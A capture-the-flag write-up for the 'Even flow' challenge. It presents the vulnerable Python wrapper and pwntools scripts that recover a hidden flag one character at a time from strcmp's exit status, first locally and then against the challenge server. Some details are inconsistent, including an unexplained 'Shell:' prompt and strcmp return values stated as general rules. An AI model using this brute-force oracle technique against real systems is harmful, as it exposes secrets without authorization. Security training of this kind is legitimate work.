# Even flow
> Do you like shell command injection?
>  
> nc ctf.pwn.sg 1601
>  
> Creator - amon (@nn_amon)

We are given the source code of the program running.

### Source code given
```
#!/usr/bin/python

import os
import sys
import re

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

"""
evenflow.c

size_t get_file_size(char * filename) {
    struct stat st;
    stat(filename, &st);
    return st.st_size;
}

int main(int argc, char ** argv) {
    FILE * fd = fopen("flag", "r");
    size_t file_size = get_file_size("flag");
    char * buffer = malloc(file_size);
    fread(buffer, 1, file_size, fd);
    return strcmp(buffer, argv[1]);
}
"""

sys.stdout.write("Flag: ")
sys.stdout.flush()
flag = sys.stdin.readline().strip()

assert(re.match("^[a-zA-Z0-9_{}]+$", flag) is not None)

os.system("./evenflow " + flag + "; echo \"$?\"");
```

We took notice of the fact that the c program, `evenflow.c`, exits with the value of `strcmp`. The value it returns gives us a clue of what the hidden flag string in the file `flag` is.

### Testing out locally

We replicated the C and Python files on my local machine with a "hidden" flag to uncover using just `strcmp`'s value. The files are in the directory `./prototype/`.

This is the C file.
```
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>


int main(int argc, char ** argv) {
    char flag[] = "CrossCTF{Hi_there}";
    return strcmp(flag, argv[1]);
}

```

We wrote this python script to iterate through all possible flag characters and compare it to the "hidden" flag string `CrossCTF{Hi_there}`. `strcmp` will check if the character is the correct character of the flag string. If it is, we concatenate it to our string `correct_flag`. We generate the correct flag like password generators generate passwords in movies.
```
from pwn import *


allowed = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}"
allowed_len = len(allowed)

MIN = 0
MAX = len(allowed)

correct_flag = ""

x=0
while (True):
	r = process('even flow.py')
	r.recvuntil('Flag: ')
	str_to_test = correct_flag + allowed[x]
	print "Testing: " + str_to_test
	r.sendline(str_to_test)
	strcmp_val_str = r.recvuntil('\n')
	print strcmp_val_str
	strcmp_val = int(strcmp_val_str[:-1])
	print "Returned: " + str(strcmp_val)
	r.close()
	if(0 < strcmp_val <= 127): #+ve means the previous character was correct
		x = (x+1) % MAX
	elif(strcmp_val > 127): #-ve means the character is not yet correct
		correct_flag += allowed[x-1]
		print "Found: " + allowed[x-1]
		x = 0
	else:
		break
		
correct_flag += allowed[x]
print "Flag: " + correct_flag
```

This is the output of runnning the script.
```
[*] Stopped process './even_flow.py' (pid 31068)
[+] Starting local process './even_flow.py': pid 31072
Testing: CrossCTF{Hi_theW
27

Returned: 27
[*] Stopped process './even_flow.py' (pid 31072)
[+] Starting local process './even_flow.py': pid 31076
Testing: CrossCTF{Hi_theX
26

Returned: 26
[*] Stopped process './even_flow.py' (pid 31076)
[+] Starting local process './even_flow.py': pid 31080
Testing: CrossCTF{Hi_theY
25

Returned: 25
[*] Stopped process './even_flow.py' (pid 31080)
[+] Starting local process './even_flow.py': pid 31084
Testing: CrossCTF{Hi_theZ
24

[...]
Returned: 4
[*] Stopped process './even_flow.py' (pid 31584)
[+] Starting local process './even_flow.py': pid 31588
Testing: CrossCTF{Hi_therez
3

Returned: 3
[*] Stopped process './even_flow.py' (pid 31588)
[+] Starting local process './even_flow.py': pid 31592
Testing: CrossCTF{Hi_there{
2

Returned: 2
[*] Stopped process './even_flow.py' (pid 31592)
[+] Starting local process './even_flow.py': pid 31596
Testing: CrossCTF{Hi_there}
0

Returned: 0
[*] Stopped process './even_flow.py' (pid 31596)
Flag: CrossCTF{Hi_there}
```

We successfully got our "hidden" flag `CrossCTF{Hi_there}`. The tactic worked. It was time to adapt it to use on the server.

### Modifying it to exploit the server

This is the modified script that will smartly bruteforce the flag's value based on `strcmp`'s return value. I will explain how it works at the end of the writeup. For now, let's focus more on how we got the flag ;).
```
from pwn import *


allowed = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}"
allowed_len = len(allowed)

MIN = 0
MAX = len(allowed)

correct_flag = "CrossCTF{"

x=0
while (True):
	r = remote('ctf.pwn.sg', 1601)
	r.recvuntil('Flag: ')
	str_to_test = correct_flag + allowed[x]
	print "Testing: " + str_to_test
	r.sendline(str_to_test)
	r.recvuntil('Shell: ')
	r.sendline('$?')
	strcmp_val_str = r.recvuntil('\n')
	print strcmp_val_str
	strcmp_val = int(strcmp_val_str[:-1])
	print "Returned: " + str(strcmp_val)
	r.close()
	if(0 < strcmp_val <= 127): #+ve means the previous character was correct
		x = (x+1) % MAX
	elif(strcmp_val > 127): #-ve means the character is not yet correct
		correct_flag += allowed[x-1]
		print "Found: " + allowed[x-1]
		x = 0
	else:
		break
		
correct_flag += allowed[x]
print "Flag: " + correct_flag
```

```
Returned: 50
[*] Closed connection to ctf.pwn.sg port 1601
[+] Opening connection to ctf.pwn.sg on port 1601: Done
Testing: CrossCTF{I_jusC
49

Returned: 49
[*] Closed connection to ctf.pwn.sg port 1601
[+] Opening connection to ctf.pwn.sg on port 1601: Done
Testing: CrossCTF{I_jusD
48

Returned: 48
[*] Closed connection to ctf.pwn.sg port 1601
[+] Opening connection to ctf.pwn.sg on port 1601: Done
Testing: CrossCTF{I_jusE

```


It took well over 20 minutes to work because we had to create a new connection for each attempt. Eventually we got the flag `CrossCTF{I_just_want_someone_to_say_to_me}`.

### Minor problem faced

It was not a perfect run though. The script was stuck in a loop for a while. We had no idea why the program did not terminate even though the flag was found. Why did `strcmp` return a value of 10? 

```
[*] Closed connection to ctf.pwn.sg port 1601
[+] Opening connection to ctf.pwn.sg on port 1601: Done
Testing: CrossCTF{I_just_want_someone_to_say_to_me}
10

Returned: 10
```


Turns out, `strcmp` returned 10 as there was a `'\n'` at the end of the flag in the server. I tested it on my own computer and got the same results:
```
[*] Stopped process './even flow.py' (pid 13693)
[+] Starting local process './even flow.py': pid 13697
Testing: CrossCTF{Hi_there}
10

Returned: 10
```

After adding the newline character as one of the valid flag characters in the Python script, the script worked perfectly.


### How does strcmp leak the secrets?

> The strcmp() function compares the two strings s1 and s2. It returns an integer less than, equal to, or greater than zero if s1 is found, respectively, to be less than, to match, or be greater than s2.

`strcmp` compares the strings lexicographically, but we have no idea what that even means. So, we decided to do some of our own testing. Examples are better teachers than complicated definitions.

1. `strcmp("CrossCTF", "A")` returns value 2. 
It is the same value returned when we execute `strcmp("C", "A")`. This is because "A" is 2 characters lower than "C".
2. `strcmp("CrossCTF", "C")` returns value 7.
It is because even though the first letters agree, the 2nd string "C" is 7 characters shorter than "CrossCTF".

3. `strcmp("CrossCTF", "D")` returns value -1.
It is the same value returned when we execute `strcmp("C", "D")`. This is because "D" is 1 character higher than "C".

So, with "E", `strcmp` returns value -2. With "F", `strcmp` returns value -3, and so on.

This means we can test all the characters [a-zA-Z] until `strcmp`'s return value turns from positive to negative. That means we have identified the correct character in the previous test. So when we received a return value -1 with `strcmp("CrossCTF", "D")`, we know that "C" is the correct character. Then we move on to test the next character.

If you wish to test out the demostration above, you can do so [here](http://php.fnlist.com/string/strcmp).
